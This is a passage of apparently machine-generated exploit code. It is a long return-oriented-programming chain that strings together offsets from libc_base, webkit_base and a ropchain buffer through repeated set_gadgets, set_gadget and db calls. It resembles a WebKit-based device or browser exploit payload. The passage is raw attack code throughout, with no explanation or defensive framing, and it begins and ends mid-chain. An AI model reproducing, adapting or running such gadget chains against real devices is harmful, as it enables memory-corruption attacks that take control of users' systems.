set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+95088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([10, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+95192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+95208, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+95296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+95352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+95424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+95480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+14461559, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+95616, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+95720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+95736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+95880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+95848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+95864, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+95952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+96008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+96088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([11, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+96192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+96208, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+96296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+96352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+96424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+96480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+272260, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+96616, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+96720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+96736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+96880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+96848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+96864, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+96952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+97008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+97088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([12, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+97192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+97208, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+97296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+97352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+97424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+97480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+97616, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+97720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+97736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+97880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+97848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+97864, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+97952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+98008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+98088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([13, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+98192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+98208, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+98296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+98352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+98424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+98480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+98568, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+98672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+98688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+98832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+98800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+98816, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+98904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+98960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+99040, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([5, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+99144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+99160, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+99248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+99304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+99408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+99512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+99528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+99672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+99640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+99656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+99744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+99800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+99880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([14, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+99984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+100000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+100088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+100144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+100216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+100272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+100408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+100512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+100528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+100672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+100640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+100656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+100744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+100800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+100880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([15, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+100984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+101000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+101088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+101144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+101216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+101272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+877877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+101408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+101512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+101528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+101672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+101640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+101656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+101744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+101800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+101880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([16, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+101984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+102000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+102088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+102144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+102216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+102272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+102408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+102512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+102528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+102672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+102640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+102656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+102744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+102800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+102880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([17, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+102984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+103000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+103088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+103144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+103216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+103272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+103360, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+103464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+103480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+103624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+103592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+103608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+103696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+103752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+103832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+103936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+103952, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+104040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+104096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+104200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+104304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+104320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+104464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+104432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+104448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+104536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+104592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+104672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([18, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+104776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+104792, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+104880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
